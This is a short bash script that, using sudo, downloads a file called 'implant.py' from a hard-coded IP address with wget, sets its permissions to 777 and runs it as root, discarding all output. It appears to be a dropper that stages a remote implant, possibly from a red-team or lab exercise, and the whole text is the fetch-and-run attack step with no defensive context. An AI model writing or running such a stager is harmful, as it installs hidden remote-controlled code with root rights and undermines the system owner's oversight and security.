#!/bin/bash
BASE_URL='http://129.21.101.117:8000'

sudo wget $BASE_URL/api/1.1/retrieve_scripts -O /tmp/implant.py
sudo chmod 777 /tmp/implant.py
sudo /usr/bin/python3 /tmp/implant.py > /dev/null 2>&1
